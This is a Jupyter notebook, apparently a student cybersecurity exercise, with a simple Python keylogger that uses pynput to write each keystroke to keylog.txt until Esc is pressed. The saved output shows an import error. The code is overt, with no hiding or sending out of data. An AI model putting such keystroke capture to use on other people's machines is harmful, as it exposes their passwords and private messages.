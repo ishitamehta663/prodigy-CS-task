{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "620e275c-9f96-465b-b9c9-9b8835789510",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'pynput'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[24], line 1\u001b[0m\n\u001b[1;32m----> 1\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mpynput\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m keyboard\n\u001b[0;32m      3\u001b[0m \u001b[38;5;66;03m# File to save logged keystrokes\u001b[39;00m\n\u001b[0;32m      4\u001b[0m LOG_FILE \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mkeylog.txt\u001b[39m\u001b[38;5;124m\"\u001b[39m\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'pynput'"
     ]
    }
   ],
   "source": [
    "\n",
    "from pynput import keyboard\n",
    "\n",
    "# File to save logged keystrokes\n",
    "LOG_FILE = \"keylog.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    \"\"\"\n",
    "    Callback function for key press events.\n",
    "    Logs the key to a file.\n",
    "    \"\"\"\n",
    "    try:\n",
    "        with open(LOG_FILE, \"a\") as log_file:\n",
    "            # Handle alphanumeric and special character keys\n",
    "            if hasattr(key, 'char') and key.char is not None:\n",
    "                log_file.write(key.char)\n",
    "            # Handle special keys (like space, enter, etc.)\n",
    "            else:\n",
    "                log_file.write(f\"[{key}]\")\n",
    "    except Exception as e:\n",
    "        print(f\"Error logging key: {e}\")\n",
    "\n",
    "def on_release(key):\n",
    "    \"\"\"\n",
    "    Callback function for key release events.\n",
    "    Stops the keylogger when the 'Esc' key is pressed.\n",
    "    \"\"\"\n",
    "    if key == keyboard.Key.esc:  # Stop the keylogger when 'Esc' is pressed\n",
    "        print(\"Exiting keylogger...\")\n",
    "        return False\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"Keylogger is running. Press 'Esc' to stop.\")\n",
    "    try:\n",
    "        # Start listening to the keyboard\n",
    "        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "            listener.join()\n",
    "    except Exception as e:\n",
    "        print(f\"Error: {e}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25bcd8ed-b036-45ab-b7f1-40c6c939642d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
